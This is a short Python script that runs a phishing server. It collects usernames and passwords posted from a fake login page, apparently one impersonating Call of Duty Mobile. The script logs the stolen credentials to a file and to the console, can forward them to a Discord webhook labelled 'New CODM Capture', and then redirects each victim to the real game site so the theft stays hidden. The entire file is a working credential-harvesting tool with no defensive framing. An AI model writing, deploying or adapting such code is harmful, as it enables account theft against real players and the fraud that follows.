#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import datetime
import os
import urllib.request
import json

PORT = int(os.environ.get("PORT", 8000))
DISCORD_WEBHOOK_URL = ""  # Optional: paste your Discord webhook URL here

class CredentialHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        post_params = urllib.parse.parse_qs(post_data.decode('utf-8'))
        
        username = post_params.get('username', [''])[0]
        password = post_params.get('password', [''])[0]
        
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"{timestamp} | Username: {username}, Password: {password}\n"
        
        # Write to file
        with open("credentials.txt", "a") as log_file:
            log_file.write(log_entry)
        
        # Print to Render Logs
        print(f"\n========== CAPTURED ==========\n{log_entry}============================\n", flush=True)
        
        # Optional: Send to Discord
        if DISCORD_WEBHOOK_URL:
            try:
                payload = json.dumps({"content": f"🎯 **New CODM Capture**\nTime: {timestamp}\nUser: `{username}`\nPass: `{password}`"}).encode('utf-8')
                req = urllib.request.Request(DISCORD_WEBHOOK_URL, data=payload, headers={"Content-Type": "application/json"})
                urllib.request.urlopen(req)
            except Exception as e:
                print(f"Discord Error: {e}", flush=True)
        
        # Redirect to official site
        self.send_response(302)
        self.send_header("Location", "https://www.callofduty.com/mobile")
        self.end_headers()

    def do_GET(self):
        super().do_GET()

with socketserver.TCPServer(("0.0.0.0", PORT), CredentialHandler) as httpd:
    print(f"Server running on port {PORT}")
    httpd.serve_forever()

